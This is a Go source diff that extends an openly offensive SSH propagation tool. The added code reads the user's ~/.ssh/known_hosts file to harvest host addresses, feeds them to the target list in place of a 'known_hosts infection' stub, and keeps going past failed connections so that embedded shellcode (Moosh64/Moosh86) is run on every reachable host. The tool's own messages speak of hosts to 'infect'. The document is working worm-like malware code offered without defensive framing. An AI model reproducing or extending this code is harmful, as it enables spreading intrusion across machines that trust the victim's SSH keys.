@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"flag"
 	"fmt"
 	"io/ioutil"
@@ -10,6 +11,8 @@ import (
 	"os/exec"
 	"os/user"
 	"path/filepath"
+	"regexp"
+	"strings"
 
 	"github.com/pkg/errors"
 	"golang.org/x/crypto/ssh"
@@ -105,6 +108,50 @@ type ShellCodeRunner interface {
 	RunShellCode(b []byte) error
 }
 
+func ParseKnownHosts() (addrs []string, ferr error) {
+	file, err := os.Open(filepath.Join(os.Getenv("HOME"), ".ssh", "known_hosts"))
+	if err != nil {
+		ferr = errors.Wrap(err, "failed to open known_hosts file")
+		return
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		line := scanner.Text()
+		if match, _ := regexp.MatchString("^[#@|]", line); match == true {
+			// the line is commented out, has a marker or has (a) hashed hostname(s)
+			continue
+		}
+		fields := strings.Split(line, " ")
+		if len(fields) < 3 {
+			// the line is missing mandatory fields, so it's probably invalid
+			continue
+		}
+		rawaddrs := strings.Split(fields[0], ",")
+		for _, rawaddr := range rawaddrs {
+			var addr string
+			fullspec, _ := regexp.Compile("\\[(.*)\\]:(.*)")
+			if fullspec.MatchString(rawaddr) {
+				// the address has a custom port
+				parts := fullspec.FindStringSubmatch(rawaddr)
+				if len(parts) != 3 {
+					msg := fmt.Sprintf("error parsing %q", rawaddr)
+					ferr = errors.New(msg)
+					return
+				}
+				addr = parts[1] + ":" + parts[2]
+			} else {
+				addr = rawaddr + ":22"
+			}
+			addrs = append(addrs, addr)
+		}
+	}
+
+	ferr = nil
+	return
+}
+
 func main() {
 	addr := flag.String("addr", "", "The lucky guy")
 	agent := flag.Bool("agent", false, "Whether or not to use SSH agent")
@@ -119,11 +166,6 @@ func main() {
 		os.Exit(1)
 	}
 
-	if *known {
-		// TODO: remove
-		log.Fatalf("known_hosts infection is not implented yet")
-	}
-
 	b := Moosh64
 	if *arch == "x86" {
 		b = Moosh86
@@ -136,7 +178,13 @@ func main() {
 			addrs = append(addrs, *addr)
 		}
 
-		//ssh.ParseKnownHosts() // TODO: implement
+		if *known {
+			knownaddrs, err := ParseKnownHosts()
+			if err != nil {
+				log.Fatalln("Error parsing known hosts")
+			}
+			addrs = append(addrs, knownaddrs...)
+		}
 
 		if len(addrs) == 0 {
 			log.Fatalf("No hosts to infect")
@@ -149,7 +197,8 @@ func main() {
 				Username: *user,
 			})
 			if err != nil {
-				log.Fatalf("Failed to initialize SSH connection: %s", err)
+				log.Printf("Failed to initialize SSH connection: %s", err)
+				continue // try next host
 			}
 
 			if err = r.RunShellCode(b); err != nil {
